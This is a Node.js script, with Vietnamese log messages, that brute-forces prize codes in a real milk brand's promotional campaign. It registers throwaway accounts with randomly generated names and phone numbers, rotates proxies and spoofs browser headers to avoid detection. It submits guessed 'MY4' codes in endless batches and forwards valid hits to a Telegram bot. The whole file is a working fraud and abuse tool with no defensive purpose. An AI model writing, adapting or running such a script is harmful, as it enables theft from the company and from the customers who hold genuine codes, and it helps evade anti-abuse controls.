const axios = require('axios');
const {randomProxy, checkProxy, requests, batchSize} = require('./proxy');
const {generateCardCode, generateRandomPhone, generateRandomUserName} = require('./handlers');
const {sendTelegramMessage} = require('./telegram');
const keep_alive = require('./keep_alive.js');

async function login(proxy) {
    try {
        const randomName = await generateRandomUserName();
        const nameParts = randomName.split(' ');
        const lastName = nameParts[0];
        const middleName = nameParts.slice(1, -1).join(' ');
        const firstName = nameParts[nameParts.length - 1];
        const phone = await generateRandomPhone();
        const data = `name=${lastName}+${middleName}+${firstName}&phone=${phone}`;
        const response = await axios.post('https://thmistoriapi.zalozns.net/backend-user/login/th', data, {
            headers: {
                'sec-ch-ua-platform': "Windows",
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'X-Pgp-Api-Media': '1',
                'sec-ch-ua-mobile': '?0',
                'Sec-Fetch-Site': 'cross-site',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Dest': 'empty',
                'host': 'thmistoriapi.zalozns.net'
            },
            httpAgent: proxy,
            httpsAgent: proxy
        });
        return response.data
    } catch (error) {
        console.error('login lỗi:', error.response ? error.response.status : error.message);
        return null
    }
}

async function checkCodeLucky(proxy, token, gift) {
    try {
        const response = await axios.get(`https://thmistoriapi.zalozns.net/campaigns/check-code-lucky/${gift}`, {
            headers: {
                'Host': 'thmistoriapi.zalozns.net',
                'sec-ch-ua-platform': 'Android',
                'authorization': token,
                'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
                'x-pgp-api-media': '1',
                'sec-ch-ua-mobile': '?1',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'x-pgp-api-campaign': 'bac_giang',
                'origin': 'https://quatangmistori.thmilk.vn',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'referer': 'https://quatangmistori.thmilk.vn/',
                'accept-encoding': 'gzip, deflate, br, zstd',
                'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
                'priority': 'u=1'
            },
            httpAgent: proxy,
            httpsAgent: proxy
        });
        return response.data

    } catch (error) {
        console.error('checkCodeLucky lỗi:', error.response ? error.response.status : error.message);
        return null
    }
}

async function handle(giftCode) {
    const proxy = await randomProxy();
    if (proxy) {
        const result = await login(proxy);
        if (result !== null) {
            if (result.result_code === 100) {
                const token = result.token;
                return await checkCodeLucky(proxy, token, giftCode);
            }
        }
    }
}

async function sendDataToAPI(code, batchNumber) {
    try {
        const giftCode = `MY4${code}`
        const response = await handle(giftCode);
        if (response && response.result_code === 100) {
            const messageText = `${giftCode}`;
            await sendTelegramMessage(messageText);
        } else {
            console.log(`[Batch ${batchNumber}] ${giftCode} ${response.title} mis`);
            if ((response.title !== '<p>Mã quay thưởng <br> không hợp lệ</p>') && (response.title !== '<p>Mã quay thưởng <br> đã sử dụng</p>')) {
                const messageUndefined = `${giftCode}`;
                await sendTelegramMessage(messageUndefined);
            }
        }

    } catch (error) {
        console.error('sendDataToAPI lỗi:', error.response ? error.response.status : error.message);
        return null;
    }
}

async function runIndependentRequests(requests, batchSize) {
    const runBatch = async (batchNumber) => {
        const promises = [];

        for (let j = 0; j < batchSize; j++) {
            const code = await generateCardCode();
            await new Promise(resolve => setTimeout(resolve, 500));
            promises.push(sendDataToAPI(code, batchNumber));
        }

        await Promise.allSettled(promises);

        console.log(`Batch ${batchNumber} đã hoàn thành`);
    };

    const batches = Math.ceil(requests / batchSize);
    const batchPromises = [];

    for (let i = 0; i < batches; i++) {
        batchPromises.push(runBatch(i + 1));
    }

    await Promise.all(batchPromises);
    console.log('Tất cả các batch đã hoàn thành. Nghỉ 25 giây...');
    await new Promise(resolve => setTimeout(resolve, 25000));
}

async function checkProxyAndRun() {
    while (true) {
        const isProxyWorking = await checkProxy();
        if (isProxyWorking) {
            await runIndependentRequests(requests, batchSize);
        } else {
            console.error("Proxy không hoạt động. Dừng lại.");
            break
        }
    }

}

checkProxyAndRun();
